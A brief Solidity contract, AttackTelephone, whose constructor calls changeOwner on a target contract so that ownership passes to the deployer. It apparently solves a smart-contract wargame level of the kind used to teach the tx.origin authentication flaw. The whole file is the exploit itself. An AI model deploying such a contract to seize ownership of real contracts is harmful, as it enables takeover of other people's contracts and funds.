// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

interface targetInterface{
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    targetInterface telephone;
    address benefactor;
    constructor(address _telephoneContract) public {
        benefactor = msg.sender;
        telephone = targetInterface(_telephoneContract);
        telephone.changeOwner(benefactor);
    }

}